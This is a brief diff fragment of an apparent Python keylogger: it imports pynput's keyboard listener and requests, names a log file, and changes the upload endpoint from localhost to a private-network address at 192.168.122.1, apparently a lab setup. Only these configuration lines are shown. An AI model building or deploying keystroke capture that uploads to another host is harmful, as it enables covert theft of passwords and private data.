@@ -5,7 +5,7 @@ import requests
 from pynput import keyboard
 
 LOG_FILE = "log.txt"
-UPLOAD_URL = "http://127.0.0.1:5000/upload"
+UPLOAD_URL = "http://192.168.122.1:5000/upload"
 
 logging.basicConfig(level=logging.INFO)
 
